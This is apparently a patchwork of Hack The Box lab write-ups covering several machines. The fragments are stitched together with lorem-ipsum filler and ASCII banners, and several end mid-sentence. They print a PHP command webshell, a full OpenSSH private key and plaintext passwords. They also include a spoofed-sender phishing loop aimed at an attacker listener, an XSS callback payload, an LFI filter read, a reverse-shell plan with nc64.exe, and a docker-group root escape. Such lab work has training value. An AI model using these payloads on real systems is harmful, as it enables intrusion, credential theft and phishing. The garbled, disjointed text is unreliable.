We can verify that this works with curl (curl http://dev.siteisup.htb -H 'Special-Dev: only4dev'), but if you want to view it in Firefox we can add a Session Handling Rule in Burp and invoke the extension Add Custom Header.\nBurp Extension Add Custom Header:\n\nProject Options &gt; Add Session Handling Rules &gt; Invoke a Burp extension:\n\nChange URL Scope and add Proxy to Tools Scope, and you should now be able to browse http://dev.siteisup.htb and upload files:\n\n\n\nStep 2\nWe know from the source code (checker.php) that following extensions is blocked: php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar. We also have to adapt to the max file size of 10kb: $_FILES['file']['size'] &gt; 10000 Lastly, the following wrappers are also blocked: !preg_match(\"#file://#i\",$site) && !preg_match(\"#data://#i\",$site) && !preg_match(\"#ftp://#i\",$site\nReading about file upload on HackTricks these are listed as usefull extensions for PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc\nPlaying around and testing to upload stuff I am able to upload this file:\n➜  updown cat shell.pht\n&lt;?php echo \"Shell\";system($_GET['cmd']); ?&gt;\nHowever when looking in the uploads directory (http://dev.siteisup.htb/uploads/) a directory is created but no file is in the dir.. Going back to the code, this probably have something to do with below line from checker.php, that’s invoked after reading the uploaded file.\n  # Delete the uploaded file.\n    @unlink($final_path);\nAfter a lot of playing around I noticed that when uploading a file, simply add some URL in the end of your code so the server will spend time to check if it’s up or not. This will keep the file alive long enough for us to see the content.\n➜  updown cat shell.phar \n&lt;?php phpinfo(); ?&gt;\nhttps://exploit.se\nhttps://exploit.se\n\nThe disabled_functions are as following:\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen\nOur normal one-line webshell are hurting since system, passthru, shell_exec, exec, popen and pcntl_exec are all disabled, however proc_open is not.

As for now it is not needed.\n\nWith all enumerated information, lets start to look for exploits.

Trying this on our login prompt is successful, we are greeted with the text “OpenSSH key not found for user -schallenge”\nThis is where I got stuck for a good while and had to turn to the forums for help. But as we could see before, the SESSION variable username can be controlled - and maybe tampered with in the cookie. Set the Name-filed to ‘username’ and Value-filed to ‘jennifer’.\nLog in and out again, and voila! We got Jennifer’s private key!\n -----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n\nSave the private key, login as Jennifer and grab user.txt.\nroot@nidus:/git/htb/openkeys# ssh jennifer@openkeys.htb -i jennifer_id-rsa Last login: Wed Jun 24 09:31:16 2020 from 10.10.14.2 OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019\nWelcome to OpenBSD: The proactively secure Unix-like operating system.\nPlease use the sendbug(1) utility to report bugs in the system.

From the document name we can guess that bnielson is a new employee. With a user-list we are able to look for password hashes with Impacket GetNPUsers, if Preauth is set - however in this case it is not. We are able to login with RPCCLIENT as anonymous, however we are unable to extract any information.\nAs nothing seems to work, I went to cewl to create a custom word list and spray passwords on the SMB service. This didn’t work either, but I noticed cewl didn’t take any words from the logs.

It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/bankrobber# nmapAutomatorDirb.sh 10.10.10.154 All PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4 |_http-title: E-coin 443/tcp open ssl/http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4 |_http-title: E-coin | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\n| http-enum: | /admin/: Possible admin folder | /admin/index.php: Possible admin folder | /Admin/: Possible admin folder | /css/: Potentially interesting directory w/ listing on ‘apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4’ | /icons/: Potentially interesting folder w/ directory listing | /img/: Potentially interesting directory w/ listing on ‘apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4’ | /js/: Potentially interesting directory w/ listing on ‘apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4’ |_ /user/: Potentially interesting folder\nDIRB: + http://10.10.10.154:80/elements.html (CODE:200|SIZE:34812) + http://10.10.10.154:80/generic.html (CODE:200|SIZE:13343) + http://10.10.10.154:80/index.php (CODE:200|SIZE:8245) + http://10.10.10.154:80/Index.php (CODE:200|SIZE:8245) + http://10.10.10.154:80/link.php (CODE:200|SIZE:0) + http://10.10.10.154:80/login.php (CODE:302|SIZE:0) + http://10.10.10.154:80/Login.php (CODE:302|SIZE:0) + http://10.10.10.154:80/logout.php (CODE:302|SIZE:0) + http://10.10.10.154:80/register.php (CODE:200|SIZE:0)\nNIKTO: + /notes.txt: This might be interesting…\nSSLSCAN: SSL Certificate: Signature Algorithm: sha1WithRSAEncryption RSA Key Strength: 1024\nSubject: localhost Issuer: localhost\nNot valid before: Nov 10 23:48:47 2009 GMT Not valid after: Nov 8 23:48:47 2019 GMT\n\nHostname: Bankrobber\nSQL: MariaDB\nSSL Cert is Invalid, expired 2019-11-08.\nnotes.txt\n\nMove all files from the default Xampp folder: TODO\nEncode comments for every IP address except localhost: Done\nTake a break..\n\n\n\nThe site is vulnerable to XSS.

The cache files are stored here: http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/\nAnd when no cache file is present we see this empty directory:\n\nA cache file is generated once a user logs in to the application, and at the same time index.php is also generated to hide the files in the directory. We can generate cache files by doing invalid logins, however since index.php is created all we see is a blank page. We need to find a way to calculate the name of the cache file, and luckily it is quiet simple.\nHere’s a short script I made to calculate the file name, and do a GET request to capture the base64 encoded data\n#!/usr/bin/env python3\nfrom hashlib import md5\nimport requests\n\nuser_id = 1\nwhile (user_id &lt; 10):\n    unhashed_key = \"user_id\" + str(user_id)\n    cache_filename =

requests.session().get(url)\n    if r.status_code != 404:\n        print(r.content)\n        break\n    user_id = user_id + 1\nRunning the script returns:\n➜  vessel ./get-cache-file.py \n1 =

Debugging with print() and writing output to file I found that the value produced from qrand() isn’t that random at all and re-appear several times, even in the same pattern. Since the seed change every loop, my script would only generate 1 password per seed. Looking on the docs for QTime.msec() we find msec() will return 0 - 999, giving us a maximum of 1000 passwords generated.\nPoC to show qtime() “random” numbers:\n➜  vessel ./genPw.py | tee output.txt \n[... snip ...]\nloop nr. 88434 - generated passwords: 999\nqrand: 31376150\nloop nr. 88435 - generated passwords: 999\nqrand: 31376150\nloop nr. 88436 - generated passwords: 999\nqrand: 31424421\nloop nr. 88437 - generated passwords: 999\nqrand: 31424421\n\n➜  vessel grep -n 31376150 output.txt\n59669:qrand: 31376150\n176871:qrand: 31376150\n\n➜  vessel grep -n 31424421 output.txt\n59671:qrand: 31424421\n176873:qrand: 31424421\nWe could also verify this a bit easier by just writing QTime.currentTime().msec() to a variable and printing the variable.\nWrite a script to loop through 0 - 999 and generate a password based on the “loop number” to generate all possible passwords.

It is a lightweight alternative to using Docker as the runtime for kubernetes.”\nGoogle cri-o “pinns” and the first article we find is one from CrowdStrike disclosing a vulnerability in CRI-O, CVE-2022-0811. Some key information from the article: - “Dubbed “cr8escape,” when invoked, an attacker could escape from a Kubernetes container and gain root access to the host and be able to move anywhere in the cluster.” - “.. discovered a flaw introduced in CRI-O version 1.19 that allows an attacker to bypass these safeguards and set arbitrary kernel parameters on the host.” - “.. anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime can abuse the “kernel.core_pattern” parameter to achieve container escape and arbitrary code execution as root on any node in the cluster.” * A PoC on how to exploit this vulnerability with kubectl\nethan@vessel:/$ crio --version\ncrio version 1.19.6\nVersion:       1.19.6\nGitCommit:     c12bb210e9888cf6160134c7e636ee952c45c05a\nGitTreeState:  clean\nBuildDate:     2022-03-15T18:18:24Z\nGoVersion:     go1.15.2\nCompiler:      gc\nPlatform:      linux/amd64\nLinkmode:      dynamic\nWe’ve most definitely found the start towards root.\n\n\nStep 2\nReading about the exploit we should (1) create a pod/container, (2) use pinns to exploit the vulnerable variable kernel.core_pattern, (3) trigger a core dump and then reap the rewards\nThis is all easy in theory, but we don’t have kubectl, minikube or docker available.

It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb/cache# nmap -Pn -sC -sV -n 10.10.10.188 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA) | 256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA) |_ 256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Cache Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\nhttp://10.10.10.188/index.html (CODE:200|SIZE:8193)\nhttp://10.10.10.188/javascript/jquery/jquery (CODE:200|SIZE:268026)\n\nNIKTO:\n\n/login.html: Admin login page/section found.\n\nVisiting the site and looking around gives us a hostname on the ‘author.html’-page, cache.htb. We also find the name of the of the author, Ash, as well as the name of his other project - HMS. A login page is obvious, trying SQLi seems to be useless. Looking through the source we can see that the form links to ‘net.html’. Visiting net.html flashes a picture and then returns us to the login page.\nWe can confirm that user ‘ash’ is correct, as it only gives us an error for the password.\nFurther enumeration in the js-files we find something. The file funtionality.js contains the following function: function checkCorrectPassword(){ var Password = $(“#password”).val(); if(Password != ‘H@v3_fun’){ alert(“Password didn’t Match”); error_correctPassword = true;\nWe are now able to login using creds ash:H@v3_fun, however it only says “Welcome Back!” along with a picture of a anime cowboy and the text “This page is still underconstruction”.

Memcached is not well known, so I decide to start there. Googling for “Memcached Priv Esc” I found a writeup for the old HTB box Dab, and within they extract data from Memcached slabs.\nProto Recv-Q Send-Q Local Address Foreign Address State PID/Program name .. tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN -\nAccess Memcached through a local Telnet session.   stats cachedump 1 1000 ITEM link [21 b; 0 s] ITEM user [5 b; 0 s] ITEM passwd [9 b; 0 s] ITEM file [7 b; 0 s] ITEM account [9 b; 0 s] END\nUser and Passwd looks promising, so we dump thoese.

So instead I went back to luffy to investigate, especially the group 999(docker) which I’ve never seen before. Googling about docker groups tells us there are an easy exploit where we can mount a folder/file to a container and/or image.\nLooking at our box we don’t have any containers, however we do have the ubuntu image which we can use for our exploit.\nluffy@cache:/dev/shm$ docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nluffy@cache:/dev/shm$ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 2ca708c1c9cc 8 months ago 64.2MB\nNext, we mount the directory /root to our docker image /mnt directory, to extract root.txt and in a real life scenario SSH-keys.\nluffy@cache:/dev/shm$ docker run –help .. -i, –interactive Keep STDIN open even if not attached -t, –tty Allocate a pseudo-TTY -v, –volume list Bind mount a volume\nluffy@cache:/dev/shm$ docker run -v /root:/mnt -it ubuntu root@30194c706a68:/# id uid=0(root) gid=0(root) groups=0(root) root@30194c706a68:/# cd /mnt/ root@30194c706a68:/mnt# ls -al .. -rw——- 1 root root 33 Jun 5 07:27 root.txt root@30194c706a68:/mnt# cat root.txt ca89fe2e56238df32bac7edc90488959\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nOpenEMR: https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf https://www.databreaches.net/openemr-patches-serious-vulnerabilities-uncovered-by-project-insecurity/ https://www.exploit-db.com/exploits/45161\nMemcached: https://medium.com/@noobintheshell/htb-dab-writeup-6459329737d0\nDocker privesc: https://www.hackingarticles.in/docker-privilege-escalation/"

As yoshihide we are able to visit https://streamio.htb/admin and can manage users, staff, movies and “leave a message for admin”.\n\n\n\n\n### Step 4 Tinkering around with the LFI I came to think of php://filter, we should be able to extract the code of the known files to see if there are any vulnerable functions that we can exploit.\n\n\n```bash ➜ streamio curl -k –cookie “PHPSESSID=ciku9juef85i9sj1eju4alj375” https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php [… snip …] PGgxPk1..\n\n\n➜ streamio echo “PGgxPk1..” | base64 -d [… snip …]\n\n\n\n\n\n\n\n\n\n\n\nAt the end we find a vulnerable function:\n\n\nWith the eval-function we are able to execute php scripts and system commands.

Looking at the ports it’s quiet obvious that you should enumerate the mail server to find users or any other valuable information.\nUsing cewl I create a wordlist and then start to fish for valid users via metasploit smtp_enum module.\nroot@nidus:/git/htb/sneakymailer# cewl -w sneaky-list.txt -d 4 http://sneakycorp.htb\nmsf5 auxiliary(scanner/smtp/smtp_enum) &gt; set user_file /git/htb/sneakymailer/sneaky-list.txt msf5 auxiliary(scanner/smtp/smtp_enum) &gt; set verbose true msf5 auxiliary(scanner/smtp/smtp_enum) &gt; run\n[*] 10.10.10.197:25 - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU) [*] 10.10.10.197:25 - 10.10.10.197:25 Domain Name: debian ..

In this attack we will include a http-link to our IP address, hoping to grab some sensitive data when the victim clicks it. To make it effective we need to make a script to loop through all the employees email addresses.\nI’ve made two different scripts, one when using your own SMTP server and the other when using the victims. NOTE: Before executing the script(s), setup a nc listener on port 80 to capture anyone clicking the link!\n\nLocal SMTP Server - for loop: root@nidus:/git/htb/sneakymailer# cat for-phish.sh #!/bin/bash for i in $(cat email.txt); do swaks –to $i –from bill.gates@microsoft.com –header “Subject: Click the link!” –body “http://10.10.14.4” –server 10.10.14.4 –port 25 done\nUsing Victim SMTP Server - while loop: root@nidus:/git/htb/sneakymailer# cat while-phish.sh #!/bin/bash inputFile=$1\nwhile read mail;\ndo\n   swaks --to $mail --from it-dep@sneakymailer.htb --header \"Subject: Security Audit\" --body \"You need to log into http://10.10.14.4/ to confirm your account.\" --server 10.10.10.197;\ndone &lt; $inputFile\n\nRunning the scripts gives us a reply from Paul Byrd, including a url encoded password.

We can start to look for any files containing the database connection and hopefully be able to extract credentials from there. Start by grabbing manage_user.php that we found earlier, and the very top gives us the database connection file; db_connect.php.\n&lt;?php \ninclude('db_connect.php');\nsession_start();\nif(isset($_GET['id'])){\n$user = $conn-&gt;query(\"SELECT * FROM users where id =\".mysql_real_escape_string($_GET['id']));\nforeach($user-&gt;fetch_array() as $k =&gt;$v){\n    $meta[$k] = $v;\n}\n}\n?&gt;\nDownload db_connect.php and bingo, we got a password!\n&lt;?php \n\n$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die(\"Could not connect to mysql\".mysqli_error($con));\nTry to login with found password against user gbyolo and/or developer:\ngbyolo@faculty:~$ id && cat user.txt\nuid=1000(gbyolo) gid=1000(gbyolo) groups=1000(gbyolo)\ncat: user.txt: No such file or directory\nWe don’t have user.txt right yet, but we can confirm that gbyolo:Co.met06aci.dly53ro.per is correct and we have a foothold on the victim.\n\n\nStep 4\nPivot! Start with usual sudo -l\ngbyolo@faculty:~$ sudo -l\n[sudo] password for gbyolo: \nMatching Defaults entries for gbyolo on faculty:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser gbyolo may run the following commands on faculty:\n    (developer) /usr/local/bin/meta-git\nWe’re able to run /usr/local/bin/meta-git as user developer, seems fitting and what we should use to pivot.

While logged in we can find some images, the administrator account name (under Contact) admin@book.htb, and nothing more really interesting.\nVisiting the admin-page (book.htb/admin) we are presented with a similar login page, however we don’t have any valid credentials nor can we create an admin account.\nLooking back at the sign up form we are limited to a username length of 10 characters, and email length of 20 characters. 20 characters is the default column length of a MySQL database, and strings that are longer will be truncated. This means that if we sign up with the email address ‘admin@book.htb randomstring’ which is 47 characters in total, the email will be truncated to ‘admin@book.htb’ (with a trailing whitespace). Now the table will have two admin users; ‘admin@book.htb’ and ‘admin@book.htb’. By default, more relaxed comparison rules are used. One of these relaxations is that trailing space characters are ignored during the comparison. This means the string ‘admin@book.htb’ is still equal to the string ‘admin@book.htb’ in the database.\nWith this in mind we can execute our SQL truncation attack via BurpSuite and/or cURL.\nroot@p3:/opt/htb/machines/book# curl -v book.htb/index.php -H “Content-Type: application/x-www-form-urlencoded” –data “name=admin&email=admin%40book.htb randomstring&password=asdf”\n\nTrying 10.10.10.176:80…\nTCP_NODELAY set\nConnected to book.htb (10.10.10.176) port 80 (#0) &gt; POST /index.php HTTP/1.1 &gt; Host: book.htb &gt; User-Agent: curl/7.67.0 &gt; Accept: / &gt; Content-Type: application/x-www-form-urlencoded &gt; Content-Length: 72 &gt;\nupload completely sent off: 72 out of 72 bytes\nMark bundle as not supporting multiuse &lt; HTTP/1.1 302 Found &lt; Date: Fri, 06 Mar 2020 08:14:31 GMT &lt; Server: Apache/2.4.29 (Ubuntu) &lt; Set-Cookie: PHPSESSID=3okm0p20tnpnf0m808nmg0fiku; path=/ &lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT &lt; Cache-Control: no-store, no-cache, must-revalidate &lt; Pragma: no-cache &lt; location: index.php &lt; Content-Length: 0 &lt; Content-Type: text/html; charset=UTF-8 &lt;\nConnection #0 to host book.htb left intact\n\n\nNow we are able to login on the admin-page with the credentials admin@book.htb:asdf\n\nAs the user, we can launch a LFI XSS attack, using the Book Submission feature.

Setup local python3 http.server in a directory containing nc64.exe b. Setup your nc listener c. Upload a webshell through the anonymous FTP d. Quickly create C:before webshell is deleted e. Quickly upload nc64.exe to C: f. Even faster execute a reverse connection from C:64.exe before BOTH webshell and nc64.exe is deleted g.

Create a new snippet, the content is irrelevant, and head over to Browse Snippets. Press edit and UPDATE without editing to capture the POST request in Burp.\nThe post body will look something like this:\n{\"name\":\"sdf\",\"content\":\"I only write in D\",\"language\":\"D\",\"public\":true}\nNow simply remove everything except \"public\":true and change the address from /snippets/update/&lt;id&gt; to /snippets/update/2 to make Jean’s snippet public.\n\nDecode the token to reveal Jeans credentials:\n➜  extension echo -n \"amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB\" | base64 -d\njean:EHmfar1Y7ppA9O5TAIXnYnJpA\nWith Jeans credentials we’re now able to access her email (mail.snippet.htb) and git (dev.snippet.htb), however SSH only accepts publickey.\nLogging into git we find an extension designed display the body of issues posted on internal repos, meaning we can post data that will be read by other team members. Looking through the code (inject.js) we find this filter in the end:\nfunction check(str) {\n    // remove tags\n    str = str.replace(/&lt;.*?&gt;/, \"\")\n\n    const filter = [\";\", \"\\'\", \"(\", \")\", \"src\", \"script\", \"&\", \"|\", \"[\", \"]\"]\n\n    for (const i of filter) {\n        if (str.includes(i))\n            return \"\"\n    }\n    return str\n}\nThe first &lt;&gt; tag is replaced with \"\", this only happens once since it’s not in a loop. Other then that, a bunch of words and characters are also filtered. The big thing here is the semi-colon as it removes most of the “standard” ways to steal cookies.\nTo test if we can get this XSS to work, I use this simple payload and wait for callbacks. &lt;replace-me&gt;&lt;img sRc=\"http://10.10.14.10?c=hello.xss\" /&gt;\n➜  extension python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.14.10 - - [08/Sep/2022 14:28:28] \"GET /?c=hello.xss HTTP/1.1\" 200 -\n10.10.11.171 - - [08/Sep/2022 14:30:32] \"GET /?c=hello.xss HTTP/1.1\" 200 -\nNow we just need to figure out what to steal, and how to do it.\n\n\nStep 4\nHere we have a few rules to follow, no parentheses and no semi colons.

If this issue persists, please contact the admin!” &gt;Hello 3lit3H4kr, &gt; Thank you for reaching out to us.\nDue to the high load of traffic our Game-Key verification-API is currently experiencing issues. We are implementing a solution to fallback to manual verification by the support staff.\nPlease use the contact form to privately contact an administrative user and send the Game-Key for manual verification. We are incredibly sorry for the inconvenience this has caused you. We are doing our best to resolve this issue promptly. &gt; Take care, your Support-Team\n\nPossible to steal an admin cookie through XSS?

Looking through each line of the code we should be able to reverse the script and thus get a valid key.\nFirst section checks if key is in valid format (ex. AAAAA-BBBBB-CCCC1-DDDDD-1234)\ndef valid_format(self) -&gt; bool:\n        return bool(match(r\"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$\", self.key))\nSecond section strips the fifth (last) group of the key, and calculates the combined ASCII Decimal value of group 1,2,3 and 4. The last, stripped, group will be used at a later stage as a checksum for verification - comparing to the combined value.\ndef calc_cs(self) -&gt; int:\n        gs = self.key.split('-')[:-1]\n        return sum([sum(bytearray(g.encode())) for g in gs])\n&gt;&gt;&gt; a = \"AAAAA-BBBBB-CCCC1-DDDDD-1234\"\n&gt;&gt;&gt; b = a.split('-')[:-1]\n&gt;&gt;&gt; print(b)\n['AAAAA', 'BBBBB', 'CCCC1', 'DDDDD']\n&gt;&gt;&gt; print(sum([sum(bytearray(g.encode())) for g in b]))\n1312\nThird section (first group) calculates that the value of the three first letters of the key to spell out K E Y, the fourth and fifth character is checked to see if it’s an integer and lastly the length is checked before moving to next function.\nValid first group could be: KEY01\ndef g1_valid(self) -&gt; bool:\n        g1 = self.key.split('-')[0]\n        r = [(ord(v)&lt;&lt;i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]\n        if r != [221, 81, 145]:\n            return False\n        for v in g1[3:]:\n            try:\n                int(v)\n            except:\n                return False\n        return len(set(g1)) == len(g1)\n&gt;&gt;&gt; g1 = \"KEY01\"\n&gt;&gt;&gt; r = [(ord(v)&lt;&lt;i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]\n&gt;&gt;&gt; print(r)\n[221, 81, 145]\n&gt;&gt;&gt; print(g1[3])\n0\n&gt;&gt;&gt; print(len(set(g1)))\n5\n&gt;&gt;&gt; print(len(g1))\n5\nForth section (second group) divides the key in two parts, p1 containing character 1,3 and 5 of the key, and p2 containing character 2 and 4. The sum function calculates the ASCII decimal value of p1 and p2, and then compares them to each other. p1 and p2 must be equal to pass as 